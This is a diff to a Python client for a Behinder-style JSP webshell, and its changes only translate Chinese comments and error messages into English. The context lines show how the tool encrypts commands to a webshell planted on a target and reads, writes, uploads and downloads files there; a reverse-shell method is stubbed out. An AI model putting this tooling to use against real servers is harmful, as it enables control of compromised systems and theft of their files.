@@ -32,7 +32,7 @@ PAYLOAD_PATH = Path(__file__).parent / "Payload.java"
 assert PAYLOAD_PATH.exists(), f"Cannot find Payload.java at {Path(__file__).parent}"
 
 def behinder_aes(payload: bytes, key: bytes) -> bytes:
-    """将给定的payload按照冰蝎的格式进行AES加密"""
+    """Encrypt payload with Behinder AES format"""
     cipher = AES.new(key, AES.MODE_ECB)
     encrypted_data = cipher.encrypt(pad(payload, AES.block_size))
     return base64.b64encode(encrypted_data)
@@ -201,10 +201,10 @@ class JSPWebshellBehinderAES:
                 )
             return data["data"]
         except httpx.TimeoutException as exc:
-            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
-            # 此时服务端会为这个session id等待这个长时间操作
-            # 所以我们再使用这个session id发起请求就会卡住
-            # 所以我们要丢掉这个session id，使用另一个client发出请求
+            # Long operations (e.g., sleep 100) can trigger HTTP timeouts for a session id
+            # The server keeps waiting for that session id
+            # Reusing the same session id can block subsequent requests
+            # Drop the session id and use another client for the request
             if self.timeout_refresh_client:
                 logger.warning("HTTP request to target timed out; trying to refresh HTTP Client")
                 self.client = get_http_client(verify=self.https_verify)
@@ -243,7 +243,7 @@ class JSPWebshellBehinderAES:
             ]
             return result
         except Exception as exc:
-            raise exceptions.TargetRuntimeError(f"解码结果失败: {exc}") from exc
+            raise exceptions.TargetRuntimeError(f"Failed to decode result: {exc}") from exc
 
     async def mkdir(self, dir_path: str) -> None:
         await self.submit_code(f"mkdir({java_repr(dir_path)})")
@@ -251,7 +251,7 @@ class JSPWebshellBehinderAES:
     async def get_file_contents(
         self, filepath: str, max_size: int | None = None
     ) -> bytes:
-        """获取文件的内容，内容是一个字节序列，不是已经解码的字符串"""
+        """Get file contents as bytes, not a decoded string"""
         if max_size is None:
             max_size = self.updownload_chunk_size
         content_b64 = await self.submit_code(
@@ -260,10 +260,10 @@ class JSPWebshellBehinderAES:
         try:
             return base64.b64decode(content_b64)
         except Exception as exc:
-            raise exceptions.TargetRuntimeError("base64解码失败") from exc
+            raise exceptions.TargetRuntimeError("Base64 decode failed") from exc
 
     async def put_file_contents(self, filepath: str, content: bytes) -> bool:
-        """保存文件的内容，内容是一个字节序列，不是已经解码的字符串"""
+        """Save file contents as bytes, not a decoded string"""
         await self.submit_code(
             f"putFileContents({java_repr(filepath)}, "
             f"base64Decode({java_repr(base64_encode(content))}))"
@@ -297,11 +297,11 @@ class JSPWebshellBehinderAES:
             f"checkUploadFilepath({java_repr(filepath)})"
         )
         if filepath_status == "WRONG_NO_PERMISSION":
-            raise exceptions.FileError("没有权限写入文件")
+            raise exceptions.FileError("No permission to write file")
         if filepath_status == "WRONG_EXISTED":
-            raise exceptions.FileError("文件已经存在")
+            raise exceptions.FileError("File already exists")
         if filepath_status != "OK":
-            raise exceptions.TargetRuntimeError("检查文件路径时发生未知错误")
+            raise exceptions.TargetRuntimeError("Unknown error while checking file path")
 
         async def upload_chunk(chunk: bytes):
             nonlocal done_coro, done_bytes
@@ -338,15 +338,15 @@ class JSPWebshellBehinderAES:
     ) -> bytes:
         filesize_text = await self.submit_code(f"getFileSize({java_repr(filepath)})")
         if filesize_text == "WRONG_NOT_EXISTS":
-            raise exceptions.FileError("文件不存在")
+            raise exceptions.FileError("File does not exist")
         if filesize_text == "WRONG_NO_PERMISSION":
-            raise exceptions.FileError("没有权限读取文件")
+            raise exceptions.FileError("No permission to read file")
         filesize = None
         try:
             filesize = int(filesize_text)
         except Exception as exc:
             raise exceptions.TargetRuntimeError(
-                f"读取文件大小失败：{filesize_text=}"
+                f"Failed to read file size: {filesize_text=}"
             ) from exc
 
         sem = asyncio.Semaphore(self.updownload_max_coroutine)
@@ -366,9 +366,9 @@ class JSPWebshellBehinderAES:
                     f"{java_repr(filepath)}, {java_repr(offset)}, {java_repr(chunk_size)})"
                 )
                 if result_b64 == "WRONG_NOT_EXISTS":
-                    raise exceptions.FileError("文件不存在或者不是一个普通文件")
+                    raise exceptions.FileError("File does not exist or is not a regular file")
                 elif result_b64 == "WRONG_NO_PERMISSION":
-                    raise exceptions.FileError("没有读取权限")
+                    raise exceptions.FileError("No read permission")
                 result = base64.b64decode(result_b64)
             async with write_state_lock:
                 done_coro += 1
@@ -393,7 +393,7 @@ class JSPWebshellBehinderAES:
             if not isinstance(chunk_result, bytes):
                 exc = chunk_result if isinstance(chunk_result, Exception) else None
                 raise exceptions.FileError(
-                    "下载文件失败: " + str(chunk_result)
+                    "File download failed: " + str(chunk_result)
                 ) from exc
             result += chunk_result
         return result
@@ -405,13 +405,13 @@ class JSPWebshellBehinderAES:
         content: bytes,
         send_method: t.Union[str, None] = None,
     ) -> t.Union[bytes, None]:
-        raise exceptions.ServerError("JSP Webshell暂时不支持此方法")
+        raise exceptions.ServerError("JSP webshell does not support this method yet")
 
     async def get_send_tcp_support_methods(self) -> t.List[str]:
-        return []  # JSP Webshell暂时不支持此方法
+        return []  # JSP webshell does not support this method yet
 
     async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
-        """获取当前的基本信息"""
+        """Get current basic info"""
         info = await self.submit_code("get_basicinfo()")
         return [
             BasicInfoEntry(key="Current Directory", value=info["current_directory"]),
@@ -421,9 +421,9 @@ class JSPWebshellBehinderAES:
         ]
 
     async def open_reverse_shell(self, host: str, port: int) -> None:
-        """打开一个反弹shell"""
-        # [TODO] 写一下这个方法
-        raise exceptions.ServerError("JSP Webshell暂时不支持此方法")
+        """Open a reverse shell"""
+        # [TODO] implement this method
+        raise exceptions.ServerError("JSP webshell does not support this method yet")
 
     async def get_pwd(self) -> str:
         return await self.submit_code("getPwd()")
